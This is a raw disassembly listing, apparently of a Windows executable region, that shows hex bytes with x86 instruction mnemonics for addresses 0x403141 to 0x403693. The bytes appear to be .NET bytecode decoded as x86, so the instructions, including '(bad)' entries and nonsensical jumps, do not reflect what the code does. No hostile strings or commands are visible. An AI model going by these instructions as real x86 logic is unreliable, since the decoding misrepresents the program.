  403141:	00 0d 00 65 72 00    	add    %cl,0x726500
  403147:	29 16                	sub    %edx,(%esi)
  403149:	00 00                	add    %al,(%eax)
  40314b:	01 1b                	add    %ebx,(%ebx)
  40314d:	30 03                	xor    %al,(%ebx)
  40314f:	00 55 00             	add    %dl,0x0(%ebp)
  403152:	00 00                	add    %al,(%eax)
  403154:	09 00                	or     %eax,(%eax)
  403156:	00 11                	add    %dl,(%ecx)
  403158:	00 00                	add    %al,(%eax)
  40315a:	72 e8                	jb     0x403144
  40315c:	3c 00                	cmp    $0x0,%al
  40315e:	70 72                	jo     0x4031d2
  403160:	73 3d                	jae    0x40319f
  403162:	00 70 72             	add    %dh,0x72(%eax)
  403165:	85 3d 00 70 28 31    	test   %edi,0x31287000
  40316b:	00 00                	add    %al,(%eax)
  40316d:	0a 74 23 00          	or     0x0(%ebx,%eiz,1),%dh
  403171:	00 01                	add    %al,(%ecx)
  403173:	0a 72 bf             	or     -0x41(%edx),%dh
  403176:	3d 00 70 06 28       	cmp    $0x28067000,%eax
  40317b:	20 00                	and    %al,(%eax)
  40317d:	00 0a                	add    %cl,(%edx)
  40317f:	00 17                	add    %dl,(%edi)
  403181:	0b de                	or     %esi,%ebx
  403183:	27                   	daa
  403184:	0c 00                	or     $0x0,%al
  403186:	72 e1                	jb     0x403169
  403188:	3d 00 70 28 1e       	cmp    $0x1e287000,%eax
  40318d:	00 00                	add    %al,(%eax)
  40318f:	0a 00                	or     (%eax),%al
  403191:	72 e8                	jb     0x40317b
  403193:	11 00                	adc    %eax,(%eax)
  403195:	70 08                	jo     0x40319f
  403197:	6f                   	outsl  %ds:(%esi),(%dx)
  403198:	21 00                	and    %eax,(%eax)
  40319a:	00 0a                	add    %cl,(%edx)
  40319c:	28 22                	sub    %ah,(%edx)
  40319e:	00 00                	add    %al,(%eax)
  4031a0:	0a 28                	or     (%eax),%ch
  4031a2:	1e                   	push   %ds
  4031a3:	00 00                	add    %al,(%eax)
  4031a5:	0a 00                	or     (%eax),%al
  4031a7:	16                   	push   %ss
  4031a8:	0b de                	or     %esi,%ebx
  4031aa:	00 07                	add    %al,(%edi)
  4031ac:	2a 00                	sub    (%eax),%al
  4031ae:	00 00                	add    %al,(%eax)
  4031b0:	01 10                	add    %edx,(%eax)
  4031b2:	00 00                	add    %al,(%eax)
  4031b4:	00 00                	add    %al,(%eax)
  4031b6:	01 00                	add    %eax,(%eax)
  4031b8:	2b 2c 00             	sub    (%eax,%eax,1),%ebp
  4031bb:	27                   	daa
  4031bc:	16                   	push   %ss
  4031bd:	00 00                	add    %al,(%eax)
  4031bf:	01 22                	add    %esp,(%edx)
  4031c1:	02 28                	add    (%eax),%ch
  4031c3:	25 00 00 0a 00       	and    $0xa0000,%eax
  4031c8:	2a 00                	sub    (%eax),%al
  4031ca:	00 00                	add    %al,(%eax)
  4031cc:	13 30                	adc    (%eax),%esi
  4031ce:	02 00                	add    (%eax),%al
  4031d0:	76 00                	jbe    0x4031d2
  4031d2:	00 00                	add    %al,(%eax)
  4031d4:	0b 00                	or     (%eax),%eax
  4031d6:	00 11                	add    %dl,(%ecx)
  4031d8:	02 28                	add    (%eax),%ch
  4031da:	25 00 00 0a 00       	and    $0xa0000,%eax
  4031df:	00 03                	add    %al,(%ebx)
  4031e1:	80 03 00             	addb   $0x0,(%ebx)
  4031e4:	00 04 7e             	add    %al,(%esi,%edi,2)
  4031e7:	03 00                	add    (%eax),%eax
  4031e9:	00 04 28             	add    %al,(%eax,%ebp,1)
  4031ec:	32 00                	xor    (%eax),%al
  4031ee:	00 0a                	add    %cl,(%edx)
  4031f0:	80 01 00             	addb   $0x0,(%ecx)
  4031f3:	00 04 04             	add    %al,(%esp,%eax,1)
  4031f6:	28 33                	sub    %dh,(%ebx)
  4031f8:	00 00                	add    %al,(%eax)
  4031fa:	0a 28                	or     (%eax),%ch
  4031fc:	33 00                	xor    (%eax),%eax
  4031fe:	00 0a                	add    %cl,(%edx)
  403200:	80 04 00 00          	addb   $0x0,(%eax,%eax,1)
  403204:	04 0e                	add    $0xe,%al
  403206:	04 0a                	add    $0xa,%al
  403208:	06                   	push   %es
  403209:	2c 0e                	sub    $0xe,%al
  40320b:	00 7e 03             	add    %bh,0x3(%esi)
  40320e:	00 00                	add    %al,(%eax)
  403210:	04 05                	add    $0x5,%al
  403212:	28 11                	sub    %dl,(%ecx)
  403214:	00 00                	add    %al,(%eax)
  403216:	06                   	push   %es
  403217:	26 00 7e 03          	add    %bh,%es:0x3(%esi)
  40321b:	00 00                	add    %al,(%eax)
  40321d:	04 73                	add    $0x73,%al
  40321f:	34 00                	xor    $0x0,%al
  403221:	00 0a                	add    %cl,(%edx)
  403223:	28 35 00 00 0a 80    	sub    %dh,0x800a0000
  403229:	05 00 00 04 02       	add    $0x2040000,%eax
  40322e:	7e 03                	jle    0x403233
  403230:	00 00                	add    %al,(%eax)
  403232:	04 28                	add    $0x28,%al
  403234:	12 00                	adc    (%eax),%al
  403236:	00 06                	add    %al,(%esi)
  403238:	80 06 00             	addb   $0x0,(%esi)
  40323b:	00 04 02             	add    %al,(%edx,%eax,1)
  40323e:	7e 03                	jle    0x403243
  403240:	00 00                	add    %al,(%eax)
  403242:	04 28                	add    $0x28,%al
  403244:	13 00                	adc    (%eax),%eax
  403246:	00 06                	add    %al,(%esi)
  403248:	80 07 00             	addb   $0x0,(%edi)
  40324b:	00 04 2a             	add    %al,(%edx,%ebp,1)
  40324e:	00 00                	add    %al,(%eax)
  403250:	1b 30                	sbb    (%eax),%esi
  403252:	03 00                	add    (%eax),%eax
  403254:	42                   	inc    %edx
  403255:	00 00                	add    %al,(%eax)
  403257:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40325a:	00 11                	add    %dl,(%ecx)
  40325c:	00 00                	add    %al,(%eax)
  40325e:	02 03                	add    (%ebx),%al
  403260:	72 29                	jb     0x40328b
  403262:	3e 00 70 28          	add    %dh,%ds:0x28(%eax)
  403266:	22 00                	and    (%eax),%al
  403268:	00 0a                	add    %cl,(%edx)
  40326a:	17                   	pop    %ss
  40326b:	28 36                	sub    %dh,(%esi)
  40326d:	00 00                	add    %al,(%eax)
  40326f:	0a 00                	or     (%eax),%al
  403271:	17                   	pop    %ss
  403272:	0a de                	or     %dh,%bl
  403274:	27                   	daa
  403275:	0b 00                	or     (%eax),%eax
  403277:	72 43                	jb     0x4032bc
  403279:	3e 00 70 28          	add    %dh,%ds:0x28(%eax)
  40327d:	1e                   	push   %ds
  40327e:	00 00                	add    %al,(%eax)
  403280:	0a 00                	or     (%eax),%al
  403282:	72 e8                	jb     0x40326c
  403284:	11 00                	adc    %eax,(%eax)
  403286:	70 07                	jo     0x40328f
  403288:	6f                   	outsl  %ds:(%esi),(%dx)
  403289:	21 00                	and    %eax,(%eax)
  40328b:	00 0a                	add    %cl,(%edx)
  40328d:	28 22                	sub    %ah,(%edx)
  40328f:	00 00                	add    %al,(%eax)
  403291:	0a 28                	or     (%eax),%ch
  403293:	1e                   	push   %ds
  403294:	00 00                	add    %al,(%eax)
  403296:	0a 00                	or     (%eax),%al
  403298:	16                   	push   %ss
  403299:	0a de                	or     %dh,%bl
  40329b:	00 06                	add    %al,(%esi)
  40329d:	2a 00                	sub    (%eax),%al
  40329f:	00 01                	add    %al,(%ecx)
  4032a1:	10 00                	adc    %al,(%eax)
  4032a3:	00 00                	add    %al,(%eax)
  4032a5:	00 01                	add    %al,(%ecx)
  4032a7:	00 18                	add    %bl,(%eax)
  4032a9:	19 00                	sbb    %eax,(%eax)
  4032ab:	27                   	daa
  4032ac:	16                   	push   %ss
  4032ad:	00 00                	add    %al,(%eax)
  4032af:	01 13                	add    %edx,(%ebx)
  4032b1:	30 04 00             	xor    %al,(%eax,%eax,1)
  4032b4:	23 00                	and    (%eax),%eax
  4032b6:	00 00                	add    %al,(%eax)
  4032b8:	0d 00 00 11 00       	or     $0x110000,%eax
  4032bd:	03 19                	add    (%ecx),%ebx
  4032bf:	17                   	pop    %ss
  4032c0:	17                   	pop    %ss
  4032c1:	73 37                	jae    0x4032fa
  4032c3:	00 00                	add    %al,(%eax)
  4032c5:	0a 0a                	or     (%edx),%cl
  4032c7:	73 38                	jae    0x403301
  4032c9:	00 00                	add    %al,(%eax)
  4032cb:	0a 0b                	or     (%ebx),%cl
  4032cd:	00 07                	add    %al,(%edi)
  4032cf:	06                   	push   %es
  4032d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4032d1:	39 00                	cmp    %eax,(%eax)
  4032d3:	00 0a                	add    %cl,(%edx)
  4032d5:	28 3a                	sub    %bh,(%edx)
  4032d7:	00 00                	add    %al,(%eax)
  4032d9:	0a 0c 2b             	or     (%ebx,%ebp,1),%cl
  4032dc:	00 08                	add    %cl,(%eax)
  4032de:	2a 00                	sub    (%eax),%al
  4032e0:	13 30                	adc    (%eax),%esi
  4032e2:	04 00                	add    $0x0,%al
  4032e4:	23 00                	and    (%eax),%eax
  4032e6:	00 00                	add    %al,(%eax)
  4032e8:	0e                   	push   %cs
  4032e9:	00 00                	add    %al,(%eax)
  4032eb:	11 00                	adc    %eax,(%eax)
  4032ed:	03 19                	add    (%ecx),%ebx
  4032ef:	17                   	pop    %ss
  4032f0:	17                   	pop    %ss
  4032f1:	73 37                	jae    0x40332a
  4032f3:	00 00                	add    %al,(%eax)
  4032f5:	0a 0a                	or     (%edx),%cl
  4032f7:	73 3b                	jae    0x403334
  4032f9:	00 00                	add    %al,(%eax)
  4032fb:	0a 0b                	or     (%ebx),%cl
  4032fd:	00 07                	add    %al,(%edi)
  4032ff:	06                   	push   %es
  403300:	6f                   	outsl  %ds:(%esi),(%dx)
  403301:	39 00                	cmp    %eax,(%eax)
  403303:	00 0a                	add    %cl,(%edx)
  403305:	28 3a                	sub    %bh,(%edx)
  403307:	00 00                	add    %al,(%eax)
  403309:	0a 0c 2b             	or     (%ebx,%ebp,1),%cl
  40330c:	00 08                	add    %cl,(%eax)
  40330e:	2a 00                	sub    (%eax),%al
  403310:	1b 30                	sbb    (%eax),%esi
  403312:	04 00                	add    $0x0,%al
  403314:	6c                   	insb   (%dx),%es:(%edi)
  403315:	01 00                	add    %eax,(%eax)
  403317:	00 0f                	add    %cl,(%edi)
  403319:	00 00                	add    %al,(%eax)
  40331b:	11 00                	adc    %eax,(%eax)
  40331d:	02 72 81             	add    -0x7f(%edx),%dh
  403320:	3e 00 70 03          	add    %dh,%ds:0x3(%eax)
  403324:	72 e9                	jb     0x40330f
  403326:	3e 00 70 28          	add    %dh,%ds:0x28(%eax)
  40332a:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  40332f:	18 00                	sbb    %al,(%eax)
  403331:	00 0a                	add    %cl,(%edx)
  403333:	00 00                	add    %al,(%eax)
  403335:	72 ed                	jb     0x403324
  403337:	3e 00 70 03          	add    %dh,%ds:0x3(%eax)
  40333b:	28 20                	sub    %ah,(%eax)
  40333d:	00 00                	add    %al,(%eax)
  40333f:	0a 00                	or     (%eax),%al
  403341:	72 0d                	jb     0x403350
  403343:	3f                   	aas
  403344:	00 70 28             	add    %dh,0x28(%eax)
  403347:	1e                   	push   %ds
  403348:	00 00                	add    %al,(%eax)
  40334a:	0a 00                	or     (%eax),%al
  40334c:	72 57                	jb     0x4033a5
  40334e:	3f                   	aas
  40334f:	00 70 28             	add    %dh,0x28(%eax)
  403352:	1e                   	push   %ds
  403353:	00 00                	add    %al,(%eax)
  403355:	0a 00                	or     (%eax),%al
  403357:	02 6f 19             	add    0x19(%edi),%ch
  40335a:	00 00                	add    %al,(%eax)
  40335c:	0a 0a                	or     (%edx),%cl
  40335e:	06                   	push   %es
  40335f:	6f                   	outsl  %ds:(%esi),(%dx)
  403360:	2a 00                	sub    (%eax),%al
  403362:	00 0a                	add    %cl,(%edx)
  403364:	0b 07                	or     (%edi),%eax
  403366:	39 de                	cmp    %ebx,%esi
  403368:	00 00                	add    %al,(%eax)
  40336a:	00 00                	add    %al,(%eax)
  40336c:	06                   	push   %es
  40336d:	06                   	push   %es
  40336e:	72 a1                	jb     0x403311
  403370:	3f                   	aas
  403371:	00 70 6f             	add    %dh,0x6f(%eax)
  403374:	2b 00                	sub    (%eax),%eax
  403376:	00 0a                	add    %cl,(%edx)
  403378:	6f                   	outsl  %ds:(%esi),(%dx)
  403379:	2c 00                	sub    $0x0,%al
  40337b:	00 0a                	add    %cl,(%edx)
  40337d:	74 23                	je     0x4033a2
  40337f:	00 00                	add    %al,(%eax)
  403381:	01 80 14 00 00 04    	add    %eax,0x4000014(%eax)
  403387:	7e 14                	jle    0x40339d
  403389:	00 00                	add    %al,(%eax)
  40338b:	04 6f                	add    $0x6f,%al
  40338d:	3c 00                	cmp    $0x0,%al
  40338f:	00 0a                	add    %cl,(%edx)
  403391:	16                   	push   %ss
  403392:	fe 03                	incb   (%ebx)
  403394:	0c 08                	or     $0x8,%al
  403396:	39 95 00 00 00 00    	cmp    %edx,0x0(%ebp)
  40339c:	06                   	push   %es
  40339d:	6f                   	outsl  %ds:(%esi),(%dx)
  40339e:	1f                   	pop    %ds
  40339f:	00 00                	add    %al,(%eax)
  4033a1:	0a 00                	or     (%eax),%al
  4033a3:	02 72 b7             	add    -0x49(%edx),%dh
  4033a6:	3f                   	aas
  4033a7:	00 70 7e             	add    %dh,0x7e(%eax)
  4033aa:	14 00                	adc    $0x0,%al
  4033ac:	00 04 72             	add    %al,(%edx,%esi,2)
  4033af:	fd                   	std
  4033b0:	3f                   	aas
  4033b1:	00 70 28             	add    %dh,0x28(%eax)
  4033b4:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  4033b9:	18 00                	sbb    %al,(%eax)
  4033bb:	00 0a                	add    %cl,(%edx)
  4033bd:	00 02                	add    %al,(%edx)
  4033bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4033c0:	19 00                	sbb    %eax,(%eax)
  4033c2:	00 0a                	add    %cl,(%edx)
  4033c4:	0a 06                	or     (%esi),%al
  4033c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4033c7:	2a 00                	sub    (%eax),%al
  4033c9:	00 0a                	add    %cl,(%edx)
  4033cb:	0d 09 2c 39 00       	or     $0x392c09,%eax
  4033d0:	06                   	push   %es
  4033d1:	16                   	push   %ss
  4033d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4033d3:	2c 00                	sub    $0x0,%al
  4033d5:	00 0a                	add    %cl,(%edx)
  4033d7:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4033d8:	29 00                	sub    %eax,(%eax)
  4033da:	00 01                	add    %al,(%ecx)
  4033dc:	80 15 00 00 04 72 0f 	adcb   $0xf,0x72040000
  4033e3:	3b 00                	cmp    (%eax),%eax
  4033e5:	70 03                	jo     0x4033ea
  4033e7:	7e 14                	jle    0x4033fd
  4033e9:	00 00                	add    %al,(%eax)
  4033eb:	04 7e                	add    $0x7e,%al
  4033ed:	15 00 00 04 8c       	adc    $0x8c040000,%eax
  4033f2:	29 00                	sub    %eax,(%eax)
  4033f4:	00 01                	add    %al,(%ecx)
  4033f6:	28 2e                	sub    %ch,(%esi)
  4033f8:	00 00                	add    %al,(%eax)
  4033fa:	0a 00                	or     (%eax),%al
  4033fc:	06                   	push   %es
  4033fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4033fe:	1f                   	pop    %ds
  4033ff:	00 00                	add    %al,(%eax)
  403401:	0a 00                	or     (%eax),%al
  403403:	17                   	pop    %ss
  403404:	13 04 de             	adc    (%esi,%ebx,8),%eax
  403407:	7d 00                	jge    0x403409
  403409:	72 03                	jb     0x40340e
  40340b:	40                   	inc    %eax
  40340c:	00 70 03             	add    %dh,0x3(%eax)
  40340f:	6f                   	outsl  %ds:(%esi),(%dx)
  403410:	3c 00                	cmp    $0x0,%al
  403412:	00 0a                	add    %cl,(%edx)
  403414:	8c 29                	mov    %gs,(%ecx)
  403416:	00 00                	add    %al,(%eax)
  403418:	01 7e 14             	add    %edi,0x14(%esi)
  40341b:	00 00                	add    %al,(%eax)
  40341d:	04 28                	add    $0x28,%al
  40341f:	3d 00 00 0a 00       	cmp    $0xa0000,%eax
  403424:	06                   	push   %es
  403425:	6f                   	outsl  %ds:(%esi),(%dx)
  403426:	1f                   	pop    %ds
  403427:	00 00                	add    %al,(%eax)
  403429:	0a 00                	or     (%eax),%al
  40342b:	16                   	push   %ss
  40342c:	13 04 de             	adc    (%esi,%ebx,8),%eax
  40342f:	55                   	push   %ebp
  403430:	00 72 c6             	add    %dh,-0x3a(%edx)
  403433:	40                   	inc    %eax
  403434:	00 70 03             	add    %dh,0x3(%eax)
  403437:	28 20                	sub    %ah,(%eax)
  403439:	00 00                	add    %al,(%eax)
  40343b:	0a 00                	or     (%eax),%al
  40343d:	06                   	push   %es
  40343e:	6f                   	outsl  %ds:(%esi),(%dx)
  40343f:	1f                   	pop    %ds
  403440:	00 00                	add    %al,(%eax)
  403442:	0a 00                	or     (%eax),%al
  403444:	16                   	push   %ss
  403445:	13 04 de             	adc    (%esi,%ebx,8),%eax
  403448:	3c 00                	cmp    $0x0,%al
  40344a:	72 c6                	jb     0x403412
  40344c:	40                   	inc    %eax
  40344d:	00 70 03             	add    %dh,0x3(%eax)
  403450:	28 20                	sub    %ah,(%eax)
  403452:	00 00                	add    %al,(%eax)
  403454:	0a 00                	or     (%eax),%al
  403456:	16                   	push   %ss
  403457:	13 04 de             	adc    (%esi,%ebx,8),%eax
  40345a:	2a 13                	sub    (%ebx),%dl
  40345c:	05 00 72 10 41       	add    $0x41107200,%eax
  403461:	00 70 28             	add    %dh,0x28(%eax)
  403464:	1e                   	push   %ds
  403465:	00 00                	add    %al,(%eax)
  403467:	0a 00                	or     (%eax),%al
  403469:	72 e8                	jb     0x403453
  40346b:	11 00                	adc    %eax,(%eax)
  40346d:	70 11                	jo     0x403480
  40346f:	05 6f 21 00 00       	add    $0x216f,%eax
  403474:	0a 28                	or     (%eax),%ch
  403476:	22 00                	and    (%eax),%al
  403478:	00 0a                	add    %cl,(%edx)
  40347a:	28 1e                	sub    %bl,(%esi)
  40347c:	00 00                	add    %al,(%eax)
  40347e:	0a 00                	or     (%eax),%al
  403480:	16                   	push   %ss
  403481:	13 04 de             	adc    (%esi,%ebx,8),%eax
  403484:	00 11                	add    %dl,(%ecx)
  403486:	04 2a                	add    $0x2a,%al
  403488:	41                   	inc    %ecx
  403489:	1c 00                	sbb    $0x0,%al
  40348b:	00 00                	add    %al,(%eax)
  40348d:	00 00                	add    %al,(%eax)
  40348f:	00 18                	add    %bl,(%eax)
  403491:	00 00                	add    %al,(%eax)
  403493:	00 27                	add    %ah,(%edi)
  403495:	01 00                	add    %eax,(%eax)
  403497:	00 3f                	add    %bh,(%edi)
  403499:	01 00                	add    %eax,(%eax)
  40349b:	00 2a                	add    %ch,(%edx)
  40349d:	00 00                	add    %al,(%eax)
  40349f:	00 16                	add    %dl,(%esi)
  4034a1:	00 00                	add    %al,(%eax)
  4034a3:	01 1b                	add    %ebx,(%ebx)
  4034a5:	30 03                	xor    %al,(%ebx)
  4034a7:	00 95 00 00 00 10    	add    %dl,0x10000000(%ebp)
  4034ad:	00 00                	add    %al,(%eax)
  4034af:	11 00                	adc    %eax,(%eax)
  4034b1:	02 72 c3             	add    -0x3d(%edx),%dh
  4034b4:	3b 00                	cmp    (%eax),%eax
  4034b6:	70 6f                	jo     0x403527
  4034b8:	18 00                	sbb    %al,(%eax)
  4034ba:	00 0a                	add    %cl,(%edx)
  4034bc:	00 00                	add    %al,(%eax)
  4034be:	02 6f 19             	add    0x19(%edi),%ch
  4034c1:	00 00                	add    %al,(%eax)
  4034c3:	0a 0a                	or     (%edx),%cl
  4034c5:	06                   	push   %es
  4034c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4034c7:	2f                   	das
  4034c8:	00 00                	add    %al,(%eax)
  4034ca:	0a 0b                	or     (%ebx),%cl
  4034cc:	2b 47 00             	sub    0x0(%edi),%eax
  4034cf:	06                   	push   %es
  4034d0:	06                   	push   %es
  4034d1:	72 9c                	jb     0x40346f
  4034d3:	3c 00                	cmp    $0x0,%al
  4034d5:	70 6f                	jo     0x403546
  4034d7:	2b 00                	sub    (%eax),%eax
  4034d9:	00 0a                	add    %cl,(%edx)
  4034db:	6f                   	outsl  %ds:(%esi),(%dx)
  4034dc:	2c 00                	sub    $0x0,%al
  4034de:	00 0a                	add    %cl,(%edx)
  4034e0:	74 23                	je     0x403505
  4034e2:	00 00                	add    %al,(%eax)
  4034e4:	01 0c 08             	add    %ecx,(%eax,%ecx,1)
  4034e7:	03 28                	add    (%eax),%ebp
  4034e9:	3e 00 00             	add    %al,%ds:(%eax)
  4034ec:	0a 0d 09 2c 23 00    	or     0x232c09,%cl
  4034f2:	06                   	push   %es
  4034f3:	06                   	push   %es
  4034f4:	72 60                	jb     0x403556
  4034f6:	41                   	inc    %ecx
  4034f7:	00 70 6f             	add    %dh,0x6f(%eax)
  4034fa:	2b 00                	sub    (%eax),%eax
  4034fc:	00 0a                	add    %cl,(%edx)
  4034fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4034ff:	2c 00                	sub    $0x0,%al
  403501:	00 0a                	add    %cl,(%edx)
  403503:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403504:	15 00 00 01 80       	adc    $0x80010000,%eax
  403509:	0b 00                	or     (%eax),%eax
  40350b:	00 04 17             	add    %al,(%edi,%edx,1)
  40350e:	80 08 00             	orb    $0x0,(%eax)
  403511:	00 04 00             	add    %al,(%eax,%eax,1)
  403514:	00 06                	add    %al,(%esi)
  403516:	6f                   	outsl  %ds:(%esi),(%dx)
  403517:	2a 00                	sub    (%eax),%al
  403519:	00 0a                	add    %cl,(%edx)
  40351b:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40351e:	04 2d                	add    $0x2d,%al
  403520:	ad                   	lods   %ds:(%esi),%eax
  403521:	00 de                	add    %bl,%dh
  403523:	12 26                	adc    (%esi),%ah
  403525:	00 72 7c             	add    %dh,0x7c(%edx)
  403528:	41                   	inc    %ecx
  403529:	00 70 28             	add    %dh,0x28(%eax)
  40352c:	1e                   	push   %ds
  40352d:	00 00                	add    %al,(%eax)
  40352f:	0a 00                	or     (%eax),%al
  403531:	17                   	pop    %ss
  403532:	13 05 de 0c 06 6f    	adc    0x6f060cde,%eax
  403538:	1f                   	pop    %ds
  403539:	00 00                	add    %al,(%eax)
  40353b:	0a 00                	or     (%eax),%al
  40353d:	17                   	pop    %ss
  40353e:	13 05 2b 00 11 05    	adc    0x511002b,%eax
  403544:	2a 00                	sub    (%eax),%al
  403546:	00 00                	add    %al,(%eax)
  403548:	01 10                	add    %edx,(%eax)
  40354a:	00 00                	add    %al,(%eax)
  40354c:	00 00                	add    %al,(%eax)
  40354e:	0d 00 67 74 00       	or     $0x746700,%eax
  403553:	12 10                	adc    (%eax),%dl
  403555:	00 00                	add    %al,(%eax)
  403557:	01 1b                	add    %ebx,(%ebx)
  403559:	30 05 00 97 00 00    	xor    %al,0x9700
  40355f:	00 11                	add    %dl,(%ecx)
  403561:	00 00                	add    %al,(%eax)
  403563:	11 00                	adc    %eax,(%eax)
  403565:	02 1b                	add    (%ebx),%bl
  403567:	8d 23                	lea    (%ebx),%esp
  403569:	00 00                	add    %al,(%eax)
  40356b:	01 25 16 72 bc 41    	add    %esp,0x41bc7216
  403571:	00 70 a2             	add    %dh,-0x5e(%eax)
  403574:	25 17 03 a2 25       	and    $0x25a20317,%eax
  403579:	18 72 fe             	sbb    %dh,-0x2(%edx)
  40357c:	41                   	inc    %ecx
  40357d:	00 70 a2             	add    %dh,-0x5e(%eax)
  403580:	25 19 7e 0b 00       	and    $0xb7e19,%eax
  403585:	00 04 0b             	add    %al,(%ebx,%ecx,1)
  403588:	12 01                	adc    (%ecx),%al
  40358a:	fe                   	(bad)
  40358b:	16                   	push   %ss
  40358c:	15 00 00 01 6f       	adc    $0x6f010000,%eax
  403591:	14 00                	adc    $0x0,%al
  403593:	00 0a                	add    %cl,(%edx)
  403595:	a2 25 1a 72 e9       	mov    %al,0xe9721a25
  40359a:	3e 00 70 a2          	add    %dh,%ds:-0x5e(%eax)
  40359e:	28 17                	sub    %dl,(%edi)
  4035a0:	00 00                	add    %al,(%eax)
  4035a2:	0a 6f 18             	or     0x18(%edi),%ch
  4035a5:	00 00                	add    %al,(%eax)
  4035a7:	0a 00                	or     (%eax),%al
  4035a9:	00 02                	add    %al,(%edx)
  4035ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4035ac:	19 00                	sbb    %eax,(%eax)
  4035ae:	00 0a                	add    %cl,(%edx)
  4035b0:	0a 06                	or     (%esi),%al
  4035b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4035b3:	1f                   	pop    %ds
  4035b4:	00 00                	add    %al,(%eax)
  4035b6:	0a 00                	or     (%eax),%al
  4035b8:	72 10                	jb     0x4035ca
  4035ba:	42                   	inc    %edx
  4035bb:	00 70 03             	add    %dh,0x3(%eax)
  4035be:	28 20                	sub    %ah,(%eax)
  4035c0:	00 00                	add    %al,(%eax)
  4035c2:	0a 00                	or     (%eax),%al
  4035c4:	00 de                	add    %bl,%dh
  4035c6:	27                   	daa
  4035c7:	0c 00                	or     $0x0,%al
  4035c9:	72 36                	jb     0x403601
  4035cb:	42                   	inc    %edx
  4035cc:	00 70 28             	add    %dh,0x28(%eax)
  4035cf:	1e                   	push   %ds
  4035d0:	00 00                	add    %al,(%eax)
  4035d2:	0a 00                	or     (%eax),%al
  4035d4:	72 e8                	jb     0x4035be
  4035d6:	11 00                	adc    %eax,(%eax)
  4035d8:	70 08                	jo     0x4035e2
  4035da:	6f                   	outsl  %ds:(%esi),(%dx)
  4035db:	21 00                	and    %eax,(%eax)
  4035dd:	00 0a                	add    %cl,(%edx)
  4035df:	28 22                	sub    %ah,(%edx)
  4035e1:	00 00                	add    %al,(%eax)
  4035e3:	0a 28                	or     (%eax),%ch
  4035e5:	1e                   	push   %ds
  4035e6:	00 00                	add    %al,(%eax)
  4035e8:	0a 00                	or     (%eax),%al
  4035ea:	16                   	push   %ss
  4035eb:	0d de 0b 06 6f       	or     $0x6f060bde,%eax
  4035f0:	1f                   	pop    %ds
  4035f1:	00 00                	add    %al,(%eax)
  4035f3:	0a 00                	or     (%eax),%al
  4035f5:	17                   	pop    %ss
  4035f6:	0d 2b 00 09 2a       	or     $0x2a09002b,%eax
  4035fb:	00 01                	add    %al,(%ecx)
  4035fd:	10 00                	adc    %al,(%eax)
  4035ff:	00 00                	add    %al,(%eax)
  403601:	00 45 00             	add    %al,0x0(%ebp)
  403604:	1e                   	push   %ds
  403605:	63 00                	arpl   %eax,(%eax)
  403607:	27                   	daa
  403608:	16                   	push   %ss
  403609:	00 00                	add    %al,(%eax)
  40360b:	01 1b                	add    %ebx,(%ebx)
  40360d:	30 04 00             	xor    %al,(%eax,%eax,1)
  403610:	7b 00                	jnp    0x403612
  403612:	00 00                	add    %al,(%eax)
  403614:	11 00                	adc    %eax,(%eax)
  403616:	00 11                	add    %dl,(%ecx)
  403618:	00 02                	add    %al,(%edx)
  40361a:	72 7a                	jb     0x403696
  40361c:	42                   	inc    %edx
  40361d:	00 70 7e             	add    %dh,0x7e(%eax)
  403620:	0b 00                	or     (%eax),%eax
  403622:	00 04 0b             	add    %al,(%ebx,%ecx,1)
  403625:	12 01                	adc    (%ecx),%al
  403627:	fe                   	(bad)
  403628:	16                   	push   %ss
  403629:	15 00 00 01 6f       	adc    $0x6f010000,%eax
  40362e:	14 00                	adc    $0x0,%al
  403630:	00 0a                	add    %cl,(%edx)
  403632:	72 e9                	jb     0x40361d
  403634:	3e 00 70 28          	add    %dh,%ds:0x28(%eax)
  403638:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  40363d:	18 00                	sbb    %al,(%eax)
  40363f:	00 0a                	add    %cl,(%edx)
  403641:	00 00                	add    %al,(%eax)
  403643:	02 6f 19             	add    0x19(%edi),%ch
  403646:	00 00                	add    %al,(%eax)
  403648:	0a 0a                	or     (%edx),%cl
  40364a:	06                   	push   %es
  40364b:	6f                   	outsl  %ds:(%esi),(%dx)
  40364c:	1f                   	pop    %ds
  40364d:	00 00                	add    %al,(%eax)
  40364f:	0a 00                	or     (%eax),%al
  403651:	72 ce                	jb     0x403621
  403653:	42                   	inc    %edx
  403654:	00 70 28             	add    %dh,0x28(%eax)
  403657:	1e                   	push   %ds
  403658:	00 00                	add    %al,(%eax)
  40365a:	0a 00                	or     (%eax),%al
  40365c:	00 de                	add    %bl,%dh
  40365e:	27                   	daa
  40365f:	0c 00                	or     $0x0,%al
  403661:	72 e8                	jb     0x40364b
  403663:	42                   	inc    %edx
  403664:	00 70 28             	add    %dh,0x28(%eax)
  403667:	1e                   	push   %ds
  403668:	00 00                	add    %al,(%eax)
  40366a:	0a 00                	or     (%eax),%al
  40366c:	72 e8                	jb     0x403656
  40366e:	11 00                	adc    %eax,(%eax)
  403670:	70 08                	jo     0x40367a
  403672:	6f                   	outsl  %ds:(%esi),(%dx)
  403673:	21 00                	and    %eax,(%eax)
  403675:	00 0a                	add    %cl,(%edx)
  403677:	28 22                	sub    %ah,(%edx)
  403679:	00 00                	add    %al,(%eax)
  40367b:	0a 28                	or     (%eax),%ch
  40367d:	1e                   	push   %ds
  40367e:	00 00                	add    %al,(%eax)
  403680:	0a 00                	or     (%eax),%al
  403682:	16                   	push   %ss
  403683:	0d de 0b 06 6f       	or     $0x6f060bde,%eax
  403688:	1f                   	pop    %ds
  403689:	00 00                	add    %al,(%eax)
  40368b:	0a 00                	or     (%eax),%al
  40368d:	17                   	pop    %ss
  40368e:	0d 2b 00 09 2a       	or     $0x2a09002b,%eax
  403693:	00 01                	add    %al,(%ecx)
